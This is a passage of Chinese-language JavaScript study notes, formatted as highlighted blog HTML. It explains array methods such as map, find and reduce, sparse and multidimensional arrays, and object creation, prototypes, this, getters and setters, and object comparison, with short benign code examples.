的返回值所组成的新数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> array1 = [<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>];<br><br><span class="hljs-comment">// Pass a function to map</span><br><span class="hljs-keyword">const</span> map1 = array1.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">x</span>) =&gt;</span> x * <span class="hljs-number">2</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map1);<br><span class="hljs-comment">// Expected output: Array [2, 8, 18, 32]</span><br></code></pre></td></tr></table></figure></li><li><p><strong>flatMap()</strong> : 先执行 map()，再执行深度为 1 的 flat()</p></li><li><p><strong>find()</strong> ：方法返回 callback 返回 true 的<strong>第一个</strong>元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a1 = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">20</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">30</span>];<br><span class="hljs-keyword">const</span> i = a1.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> <span class="hljs-keyword">typeof</span> item === <span class="hljs-string">&quot;number&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i); <span class="hljs-comment">// 10</span><br></code></pre></td></tr></table></figure></li><li><p><strong>findLast()</strong> ：返回 callback 返回 true 的<strong>最后一个</strong>元素。</p></li><li><p><strong>findIndex()</strong> ：返回 callback 返回 true 的<strong>第一个</strong>元素的<strong>索引</strong>。</p></li><li><p><strong>findLastIndex()</strong> ：返回 callback 返回 true 的<strong>最后一个</strong>元素的<strong>索引</strong>。</p></li><li><p>every()  ：如果如果 <code>callback</code> 对数组中的每一个元素都返回 <code>true</code>，则返回true</p></li><li><p>some() ：如果 <code>callback</code> 对数组中至少一个元素返回 <code>true</code>，返回true。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/reduce">reduce()</a> ：对数组中的每个值执行 <code>callback(accumulator, currentValue, currentIndex, Array)</code>。将列表中的元素减少到单个值。返回 <code>callback</code> 函数返回的最终值。(常用于条件统计)</p><ul><li><p>案例：统计todo.done为true的个数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//forEach遍历法：</span><br><span class="hljs-title function_">doneTotal</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span>(todo.<span class="hljs-property">done</span>) i++<br>  &#125;);<br>  <span class="hljs-keyword">return</span> i<br>&#125;<br><br><span class="hljs-comment">//array.reduce方法</span><br><span class="hljs-title function_">doneTotal</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">const</span> x = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">pre,current</span>)=&gt;</span>&#123;<br>  <span class="hljs-keyword">return</span> pre + (current.<span class="hljs-property">done</span> ? <span class="hljs-number">1</span>:<span class="hljs-number">0</span>)<br>&#125;,<span class="hljs-number">0</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x)<br>&#125;<br><span class="hljs-comment">//简写：</span><br><span class="hljs-title function_">doneTotal</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">pre,current</span>)=&gt;</span> pre+(current.<span class="hljs-property">done</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>),<span class="hljs-number">0</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/reduceRight">reduceRight()</a> ：工作原理类似于 <code>reduce()</code>，但从最后一个元素开始。</p></li></ul><h3 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h3><p>数组可以包含空槽（不是用undefined填充）。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-title class_">Array</span>(<span class="hljs-number">5</span>); <span class="hljs-comment">// [ &lt;5 empty items&gt; ]</span><br><span class="hljs-keyword">const</span> b = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, , , <span class="hljs-number">5</span>]; <span class="hljs-comment">// [ 1, 2, &lt;2 empty items&gt;, 5 ]</span><br></code></pre></td></tr></table></figure><p>但在某些操作里，空槽就像是被填入了undefined一样。</p><p>例如索引访问空槽、for…of、展开运算，都返回undefined。</p><p>而且在其他方法，特别是<strong>迭代</strong>方法，空槽直接被<strong>跳过</strong>。</p><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p>数组可以嵌套，所以可以创建多维数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>  a[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span>);<br>  <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>    a[i][j] = <span class="hljs-string">&quot;[&quot;</span> + i + <span class="hljs-string">&quot;,&quot;</span> + j + <span class="hljs-string">&quot;]&quot;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">Row 0: <span class="hljs-comment">[0,0]</span> <span class="hljs-comment">[0,1]</span> <span class="hljs-comment">[0,2]</span> <span class="hljs-comment">[0,3]</span><br>Row 1: <span class="hljs-comment">[1,0]</span> <span class="hljs-comment">[1,1]</span> <span class="hljs-comment">[1,2]</span> <span class="hljs-comment">[1,3]</span><br>Row 2: <span class="hljs-comment">[2,0]</span> <span class="hljs-comment">[2,1]</span> <span class="hljs-comment">[2,2]</span> <span class="hljs-comment">[2,3]</span><br>Row 3: <span class="hljs-comment">[3,0]</span> <span class="hljs-comment">[3,1]</span> <span class="hljs-comment">[3,2]</span> <span class="hljs-comment">[3,3]</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="类数组对象"><a href="#类数组对象" class="headerlink" title="类数组对象"></a>类数组对象</h3><p>一些JavaScript对象（如 <u>document.getElementsByTagName()</u> 返回的 <u>NodeList</u> 或 <u>arguments</u> 等 JavaScript 对象），有与数组相似的行为。</p><p>但并不共享数组的所有方法，直接调用会报错。</p><p>可以通过<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/call"><code>Function.prototype.call()</code></a> 间接调用它们。</p><h2 id="1-10对象"><a href="#1-10对象" class="headerlink" title="1.10对象"></a>1.10对象</h2><p>在JavaScript中，一个对象可以是一个单独的拥有属性和类型的实体。</p><h3 id="创建新对象"><a href="#创建新对象" class="headerlink" title="创建新对象"></a>创建新对象</h3><ul><li><p><strong>对象初始化器</strong></p><p>语法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> obj = &#123;<br>  <span class="hljs-attr">property_1</span>: value_1, <span class="hljs-comment">// property_# 可以是一个标识符...</span><br>  <span class="hljs-number">2</span>: value_2, <span class="hljs-comment">// 或一个数字...</span><br>  [<span class="hljs-string">&quot;property&quot;</span> + <span class="hljs-number">3</span>]: value_3, <span class="hljs-comment">//  或一个可计算的 key 名...</span><br>  <span class="hljs-comment">// ...,</span><br>  <span class="hljs-string">&quot;property n&quot;</span>: value_n,<br>&#125;; <span class="hljs-comment">// 或一个字符串</span><br></code></pre></td></tr></table></figure><ul><li>js1.1及更早版本无法使用</li></ul></li><li><p><strong>构造函数</strong></p><p>两步：</p><ol><li>通过创建一个构造函数来定义对象的类型。(常将首字母大写)</li><li>通过<code>new</code>创建对象实例。</li></ol><p>案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">make, model, year</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">make</span> = make; <span class="hljs-comment">//this将传入函数的值赋给对象</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">model</span> = model;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">year</span> = year;<br>&#125;<br><br><span class="hljs-keyword">var</span> mycar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&quot;Eagle&quot;</span>, <span class="hljs-string">&quot;Talon TSi&quot;</span>, <span class="hljs-number">1993</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>Object.create()</strong></p><p>该方法允许你为创建的对象选择一个原型对象，而不用定义构造函数。</p><p>案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Animal properties and method encapsulation</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Animal</span> = &#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;Invertebrates&quot;</span>, <span class="hljs-comment">// 属性默认值</span><br>  <span class="hljs-attr">displayType</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 用于显示 type 属性的方法</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span>);<br>  &#125;,<br>&#125;;<br><br><span class="hljs-comment">// 创建一种新的动物——animal1</span><br><span class="hljs-keyword">var</span> animal1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>);<br>animal1.<span class="hljs-title function_">displayType</span>(); <span class="hljs-comment">// Output:Invertebrates</span><br><br><span class="hljs-comment">// 创建一种新的动物——Fishes</span><br><span class="hljs-keyword">var</span> fish = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>);<br>fish.<span class="hljs-property">type</span> = <span class="hljs-string">&quot;Fishes&quot;</span>;<br>fish.<span class="hljs-title function_">displayType</span>(); <span class="hljs-comment">// Output:Fishes</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="对象属性"><a href="#对象属性" class="headerlink" title="对象属性"></a>对象属性</h3><p>一个JS对象可以有很多属性。</p><p>对象的属性和普通js变量基本没有什么区别，一个对象的属性可以被理解为一个附加到对象上的变量。</p><p>通过点符号<code>.</code>来访问一个对象的属性，也可使用方括号<code>[]</code>访问或设置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">objectName.<span class="hljs-property">propertyName</span>;<br></code></pre></td></tr></table></figure><p>一个属性的名称若不是一个有效的 JavaScript 标识符（例如，一个由空格或连字符，或者以数字开头的属性名），就只能通过方括号标记访问。</p><p>对象中<strong>未赋值</strong>的属性的值为<strong>undefined</strong>（不是null）。</p><p>一个对象的<strong>属性</strong>可以是<strong>另一个对象</strong>。</p><h4 id="枚举一个对象的所有属性"><a href="#枚举一个对象的所有属性" class="headerlink" title="枚举一个对象的所有属性"></a>枚举一个对象的所有属性</h4><p>从ES5开始，有三种原生方法：</p><ul><li><strong>for…in</strong>循环</li><li>**Object.keys(o)**：该方法返回对象 o 自身包含（不包括原型中）的所有可枚举属性的名称的数组。 </li><li><strong>Object.getOwnPropertyNames(o)</strong> ：该方法返回对象 o 自身包含（不包括原型中）的所有属性 (无论是否可枚举) 的名称的数组。</li></ul><p>ES5之前，没有枚举一个对象所有属性的原生方法。</p><h4 id="对象属性索引"><a href="#对象属性索引" class="headerlink" title="对象属性索引"></a>对象属性索引</h4><p>在JavaScript1.0中，可以通过 名称 或 序号 来访问一个属性。</p><p>但在JavaScript1.1之后，如果最初使用名称定义属性，就必须使用名称来访问；最初使用序号，就必须通过索引访问。</p><p>例如<code>myCar[5] = &quot;25&quot;;</code>只能通过<code>myCar[5]</code>来访问。</p><p>这条规则的<strong>例外</strong>是从<strong>与 HTML 对应的对象</strong>，例如 <code>forms</code> 数组。可以通过序号（在文档中出现的顺序），也可以通过名称访问。</p><p>例如文档中的第二个 <code>&lt;form&gt;</code> 标签有一个 <code>NAME</code> 属性且值为 <code>&quot;myForm&quot;</code>，访问该 <code>form</code> 的方式可以是 <code>document.forms[1]</code>，<code>document.forms[&quot;myForm&quot;]</code> 或 <code>document.myForm</code>。</p><h4 id="删除属性"><a href="#删除属性" class="headerlink" title="删除属性"></a>删除属性</h4><p>可以用<code>delete</code>操作符删除一个<strong>不是继承而来</strong>的属性。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Creates a new object, myobj, with two properties, a and b.</span><br><span class="hljs-keyword">const</span> myobj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>myobj.<span class="hljs-property">a</span> = <span class="hljs-number">5</span>;<br>myobj.<span class="hljs-property">b</span> = <span class="hljs-number">12</span>;<br><br><span class="hljs-comment">// Removes the a property, leaving myobj with only the b property.</span><br><span class="hljs-keyword">delete</span> myobj.<span class="hljs-property">a</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;a&quot;</span> <span class="hljs-keyword">in</span> myobj); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>所有的 JavaScript 对象<strong>至少继承于一个对象</strong>。</p><p>被继承的对象被称作<strong>原型</strong>，并且继承的属性可通过构造函数的<code>prototype</code>对象找到。</p><h4 id="对象类型添加属性-prototype"><a href="#对象类型添加属性-prototype" class="headerlink" title="对象类型添加属性 - prototype"></a>对象类型添加属性 - prototype</h4><p>可以通过<code>prototype</code>为之前定义的<strong>对象类型添加属性</strong>。这为该类型的所有对象，而不是仅仅一个对象增加了一个属性。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Ctor</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>();<br><span class="hljs-keyword">const</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctor</span>();<br><span class="hljs-title class_">Ctor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">prop</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p1.<span class="hljs-property">prop</span>); <span class="hljs-comment">// 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p2.<span class="hljs-property">prop</span>); <span class="hljs-comment">// 1</span><br></code></pre></td></tr></table></figure><h3 id="定义方法"><a href="#定义方法" class="headerlink" title="定义方法"></a>定义方法</h3><p>方法是与对象关联的函数，也可以说是，<u>某个函数</u>作为对象属性，这个对象属性就叫方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">objectName.<span class="hljs-property">methodname</span> = function_name;<br><br><span class="hljs-keyword">var</span> myObj = &#123;<br>  <span class="hljs-attr">myMethod</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">params</span>) &#123;<br>    <span class="hljs-comment">// ...do something</span><br>  &#125;<br><br>  <span class="hljs-comment">// 或者 这样写也可以</span><br><br>  <span class="hljs-title function_">myOtherMethod</span>(<span class="hljs-params">params</span>) &#123;<br>    <span class="hljs-comment">// ...do something else</span><br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>objectName</code>为是一个已经存在的对象。</li><li><code>methodname</code>是方法名</li><li><code>function_name</code>是函数名。</li></ul><p>方法通常在构造函数的原型（<code>prototype</code>）对象上定义，以便相同类型的所有对象共享相同的方法。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">displayCar</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> result = <span class="hljs-string">`A Beautiful <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.year&#125;</span> <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.make&#125;</span> <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.model&#125;</span>`</span>;<br>  <span class="hljs-title function_">pretty_print</span>(result);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意<code>this</code>用于指代方法所属的对象。</p><p>然后使用<code>displayCar</code>调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">car1.<span class="hljs-title function_">displayCar</span>();<br>car2.<span class="hljs-title function_">displayCar</span>();<br></code></pre></td></tr></table></figure><h4 id="通过this引用对象"><a href="#通过this引用对象" class="headerlink" title="通过this引用对象"></a>通过this引用对象</h4><p><code>this</code>是一个特殊的关键字，可以在方法中使用它来<strong>指代当前对象</strong>。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Manager</span> = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Karina&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>,<br>  <span class="hljs-attr">job</span>: <span class="hljs-string">&quot;Software Engineer&quot;</span>,<br>&#125;;<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">Intern</span> = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Tyrone&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>,<br>  <span class="hljs-attr">job</span>: <span class="hljs-string">&quot;Software Engineer Intern&quot;</span>,<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;<br><br><span class="hljs-comment">// add sayHi function to both objects</span><br><span class="hljs-title class_">Manager</span>.<span class="hljs-property">sayHi</span> = sayHi;<br><span class="hljs-title class_">Intern</span>.<span class="hljs-property">sayHi</span> = sayHi;<br><br><span class="hljs-title class_">Manager</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// Hello, my name is Karina</span><br><span class="hljs-title class_">Intern</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// Hello, my name is Tyrone</span><br></code></pre></td></tr></table></figure><p><code>this</code>是一个函数调用的“隐藏参数”，通过在被调用函数之前指定对象来传递。</p><p>例如在<code>Manager.say()</code>，<code>this</code>指<code>Mangaer</code>对象，因为<code>Manager</code>在函数<code>sayHi()</code>之前。</p><p>如果使用其他方法调用函数，如<code>Function.prototype.call（）</code>或<code>Reflect.apply（）</code>，则可以显式地将this的值作为参数传递。</p><ul><li><p><code>Function.prototype.</code> <strong><code>apply()</code></strong> 方法会以给定的 <code>this</code> 值和作为数组（或类数组对象）提供的 <code>arguments</code> 调用该函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>];<br><span class="hljs-keyword">const</span> max = <span class="hljs-title class_">Math</span>.<span class="hljs-property">max</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, numbers); <br><span class="hljs-comment">//也可以使用spread操作符写作Math.max(...numbers); </span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(max);<span class="hljs-comment">//7</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="定义getter和setter"><a href="#定义getter和setter" class="headerlink" title="定义getter和setter"></a>定义getter和setter</h3><p><strong>getter</strong>：用于<strong>获取</strong>某个特定属性的值的方法。</p><p><strong>setter</strong>：<strong>设定</strong>某个属性的值的方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> o = &#123;<br>  <span class="hljs-attr">a</span>: <span class="hljs-number">7</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">b</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-number">1</span>;<br>  &#125;,<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">x</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> = x / <span class="hljs-number">2</span>;<br>  &#125;,<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o.<span class="hljs-property">a</span>); <span class="hljs-comment">// 7</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o.<span class="hljs-property">b</span>); <span class="hljs-comment">// 8</span><br>o.<span class="hljs-property">c</span> = <span class="hljs-number">50</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o.<span class="hljs-property">a</span>); <span class="hljs-comment">// 25</span><br></code></pre></td></tr></table></figure><ul><li><code>o.a</code> — 数字</li><li><code>o.b</code> — 返回 <code>o.a</code> + 1 的 getter</li><li><code>o.c</code> — 由 <code>o.c 的值所设置 o.a 值的</code> setter</li></ul><p>定义一个已经声明的函数作为的 getter 和 setter 方法，使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty"><code>Object.defineProperty</code></a>(或者 [<code>Object.prototype.__defineGetter__</code>) 旧语法回退)</p><ul><li><strong><code>Object.defineProperty()</code></strong> 静态方法会直接在一个对象上定义一个新属性，或修改其现有属性，并返回此对象。</li></ul><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> myObj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">0</span> &#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperties</span>(myObj, &#123;<br>  <span class="hljs-attr">b</span>: &#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> + <span class="hljs-number">1</span>;<br>    &#125;,<br>  &#125;,<br>  <span class="hljs-attr">c</span>: &#123;<br>    <span class="hljs-title function_">set</span>(<span class="hljs-params">x</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span> = x / <span class="hljs-number">2</span>;<br>    &#125;,<br>  &#125;,<br>&#125;);<br><br>myObj.<span class="hljs-property">c</span> = <span class="hljs-number">10</span>; <span class="hljs-comment">// Runs the setter, which assigns 10 / 2 (5) to the &#x27;a&#x27; property</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myObj.<span class="hljs-property">b</span>); <span class="hljs-comment">// Runs the getter, which yields a + 1 or 6</span><br></code></pre></td></tr></table></figure><p>原则上，getter和setter既可以</p><ul><li>使用对象初始化器定义</li><li>也可以 之后岁时使用getter和settter添加方法到任何对象</li></ul><h3 id="比较对象"><a href="#比较对象" class="headerlink" title="比较对象"></a>比较对象</h3><p>在 JavaScript 中，<strong>objects 是一种引用类型</strong>。</p><p>所以两个独立声明的对象永远也不会相等。</p><p>即使他们有相同的属性，只有在比较一个对象和这个对象的<u>引用</u>时，才会返回 true.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 两个变量，两个具有同样的属性、但不相同的对象</span><br><span class="hljs-keyword">var</span> fruit = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;apple&quot;</span> &#125;;<br><span class="hljs-keyword">var</span> fruitbear = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;apple&quot;</span> &#125;;<br><br>fruit == fruitbear; <span class="hljs-comment">// return false</span><br>fruit === fruitbear; <span class="hljs-comment">// return false</span><br></code></pre></td></tr></table></figure><ul><li><code>===</code>运算符用来检查数值是否相等<ul><li>1&#x3D;&#x3D; “1” —— true</li><li>1&#x3D;&#x3D;&#x3D; “1” —— false</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 